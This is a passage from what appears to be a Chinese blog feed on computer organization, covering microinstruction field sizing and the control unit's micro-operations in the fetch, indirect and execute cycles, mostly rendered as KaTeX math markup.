</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>18</mn><mtext> 条 </mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext> Ad ( CMDR </mtext><mo stretchy="false">)</mo><mo>⟶</mo><mtext> CMAR </mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\text { 其中 }\left\{\begin{array}{lr}1 \text { 条 } &amp; \text { OP }(\text { IR }) \longrightarrow \text { 微地址形成部件 } \longrightarrow \text { CMAR } \\18 \text { 条 } &amp; \text { Ad ( CMDR }) \longrightarrow \text { CMAR }\end{array}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">其中</span><span class="mord"> </span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">条</span><span class="mord"> </span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">8</span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">条</span><span class="mord"> </span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord"> OP </span></span><span class="mopen">(</span><span class="mord text"><span class="mord"> IR </span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟶</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">微地址形成部件</span><span class="mord"> </span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟶</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord text"><span class="mord"> CMAR </span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord"> Ad ( CMDR </span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟶</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord text"><span class="mord"> CMAR </span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>若用Ad(CMDR)直接送入控存地址线，即省略CMAR，则可以省略掉以上19条指令，2个微操作。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706203838160.png" alt="image-20240706203838160" style="zoom:50%;" /><p>此时微指令：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>38</mn><mo>−</mo><mn>19</mn><mo>=</mo><mn>19</mn></mrow><annotation encoding="application/x-tex">38-19=19</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span></span></span></span> 下地址字段最少5位</p><p>此时微操作：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mo>−</mo><mn>2</mn><mo>=</mo><mn>18</mn></mrow><annotation encoding="application/x-tex">20-2=18</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">8</span></span></span></span> 操作控制字段最少18位</p><p>考虑留有一定的容量方便后续扩展，有：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mtable rowspacing="0.15999999999999992em" columnalign="left right" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext> 取操作控制字段 </mtext></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>18</mn><mtext> 位 </mtext><mo>→</mo><mn>24</mn><mtext> 位 </mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext> 下地此字段 </mtext></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>5</mn><mtext> 位一 </mtext><mn>6</mn><mtext> 位 </mtext></mrow></mstyle></mtd></mtr></mtable><mo fence="true">}</mo></mrow><mtext> 共 </mtext><mn>30</mn><mtext> 位 </mtext></mrow><annotation encoding="application/x-tex">\left.\begin{array}{lr}\text { 取操作控制字段 } &amp; 18 \text { 位 } \rightarrow 24 \text { 位 } \\\text { 下地此字段 } &amp; 5 \text { 位一 } 6 \text { 位 }\end{array}\right\} \text { 共 } 30 \text { 位 }</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen nulldelimiter"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">取操作控制字段</span><span class="mord"> </span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">下地此字段</span><span class="mord"> </span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">8</span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">位</span><span class="mord"> </span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">4</span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">位</span><span class="mord"> </span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">位一</span><span class="mord"> </span></span><span class="mord">6</span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">位</span><span class="mord"> </span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">}</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">共</span><span class="mord"> </span></span><span class="mord">3</span><span class="mord">0</span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">位</span><span class="mord"> </span></span></span></span></span></p></li><li><p>定义微指令操作字段每一位的操作</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706204036976.png" style="zoom:50%;" /></li></ul><h5 id="编写微指令码点"><a class="markdownIt-Anchor" href="#编写微指令码点"></a> 编写微指令码点</h5><p>规定每一位的操作如下（部分）：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706204256674.png" alt="image-20240706204256674" /></p><p>画出码点图</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706204429307.png" alt="image-20240706204429307" /></p><p>即根据划分的节拍和规定的操作标1，最后即可得到微指令对应的码点。</p><p>……</p><p>……</p><p>本博客的内容就到此结束了，希望能帮助你更深刻的理解计算机组成原理这门课程，该说不说还挺有意思的。</p><p>那么，完结撒花💮💮ヽ(°▽°)ノ💮</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/C10AD1752A521C3C297E7D81400952F1.jpg" alt="C10AD1752A521C3C297E7D81400952F1" /></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成指北 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
            <tag> 控制单元设计 </tag>
            
            <tag> 微指令编码方式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成指北（六）</title>
      <link href="/posts/4ddedbf342f8/"/>
      <url>/posts/4ddedbf342f8/</url>
      
        <content type="html"><![CDATA[<h2 id="第九章-控制单元的功能"><a class="markdownIt-Anchor" href="#第九章-控制单元的功能"></a> 第九章 控制单元的功能</h2><blockquote><p>掌握多级时序的概念，时钟周期，节拍</p><p>相对简单，要对CU的运行有一个基本的轮廓</p></blockquote><p>到现在为止，我们已经介绍完了CPU的ALU、寄存器（存储器）、中断系统，只差CU模块还没有介绍。这一章我们就来介绍CPU的最后一个组成部分：CU控制单元。</p><p>控制单位的主要功能之一就是完成指令的解释。我们以CU分析和执行指令的过程为例，说明控制单元要完成哪些功能。</p><h3 id="微操作命令的分析"><a class="markdownIt-Anchor" href="#微操作命令的分析"></a> 微操作命令的分析</h3><p>微操作，即在指令执行过程中，由CU发出的指令，比整条操作指令小的多。我们现在分别从指令执行的不同阶段，来学习CU在此期间的作用。</p><p>在介绍指令系统时我们知道，完成一条指令分4个工作周期<strong>取指周期、间址周期、执行周期和中断周期</strong>。我们就按照这四个周期，来一一分析CU的功能。</p><h4 id="取指周期"><a class="markdownIt-Anchor" href="#取指周期"></a> 取指周期</h4><p>取指周期的过程可以归纳为以下几个微操作：</p><ol><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>C</mi><mo>→</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo>→</mo><mtext>地址线</mtext></mrow><annotation encoding="application/x-tex">PC\rightarrow MAR\rightarrow 地址线</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mord cjk_fallback">线</span></span></span></span></p><p>PC将指令地址送入地址寄存器MAR，通过地址总线发出</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">1\rightarrow R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>这里的R指的是控制寄存器，由控制寄存器传输信号给控制总线向主存发送读命令</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">M(MAR)\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>将MAR所指的主存单元中的内容经过数据总线读入MDR内</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>D</mi><mi>R</mi><mo>→</mo><mi>I</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">MDR\rightarrow IR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>MDR将内容送至指令寄存器IR内</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mi>P</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>U</mi></mrow><annotation encoding="application/x-tex">OP(IR)\rightarrow CU</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></p><p>CU对指令的操作码进行译码</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo>→</mo><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">(PC)+1\rightarrow PC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></p><p>PC形成下一条指令的地址。注意，只有且必须在取指周期递增一次PC。如果学过8086汇编语言，你就会知道CPU执行指令的过程是先将指令读入指令寄存器，然后递增IP指向下一条指令。那么递增这个操作，实际上就是在取指周期内完成的。</p></li></ol><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240620193217182.png" alt="image-20240620193217182" style="zoom:50%;" /><h4 id="间址周期"><a class="markdownIt-Anchor" href="#间址周期"></a> 间址周期</h4><p>间址周期完成取操作数有效地址的任务，具体操作如下：</p><ol><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">Ad(IR)\rightarrow MAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>将指令的形式地址送入MAR</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">1\rightarrow R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>启动读操作</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">M(MAR)\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p>将形式地址内的数据传回MDR</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>D</mi><mi>R</mi><mo>→</mo><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">MDR\rightarrow Ad(IR)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></p><p>将MDR内的有效地址送至指令寄存器的地址字段</p></li></ol><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240620193603661.png" alt="image-20240620193603661" style="zoom:50%;" /><h4 id="执行周期"><a class="markdownIt-Anchor" href="#执行周期"></a> 执行周期</h4><p>执行周期的过程相对比较复杂。不同于取指周期和间址周期，执行周期会根据指令操作的差异而改变。我们将分别讨论非访存指令、访存指令和转移指令的微指令操作。</p><h5 id="非访存指令"><a class="markdownIt-Anchor" href="#非访存指令"></a> 非访存指令</h5><p>非访存指令比较简单，因为不涉及访存，所以不需要用到总线传输以及地址及数据寄存器。有以下指令是非访存的：</p><table><thead><tr><th>指令</th><th>功能</th><th>微指令操作</th></tr></thead><tbody><tr><td>CLA</td><td>清除ACC的值</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>→</mo><mi>A</mi><mi>C</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">0\rightarrow ACC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></td></tr><tr><td>COM</td><td>将ACC内的值取反</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>A</mi><mi>C</mi><mi>C</mi></mrow><mo stretchy="true">‾</mo></mover><mo>→</mo><mi>A</mi><mi>C</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">\overline{ACC}\rightarrow ACC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></td></tr><tr><td>SHR</td><td>算术右移</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>A</mi><mi>C</mi><mi>C</mi><mo stretchy="false">)</mo><mo>→</mo><mi>R</mi><mo stretchy="false">(</mo><mi>A</mi><mi>C</mi><mi>C</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>A</mi><mi>C</mi><msub><mi>C</mi><mn>0</mn></msub><mo>→</mo><mi>A</mi><mi>C</mi><msub><mi>C</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">L(ACC)\rightarrow R(ACC),ACC_0\rightarrow ACC_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td></tr><tr><td>CSL</td><td>循环左移</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><mi>A</mi><mi>C</mi><mi>C</mi><mo stretchy="false">)</mo><mo>→</mo><mi>L</mi><mo stretchy="false">(</mo><mi>A</mi><mi>C</mi><mi>C</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>A</mi><mi>C</mi><msub><mi>C</mi><mn>0</mn></msub><mo>→</mo><mi>A</mi><mi>C</mi><msub><mi>C</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">R(ACC)\rightarrow L(ACC),ACC_0\rightarrow ACC_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" 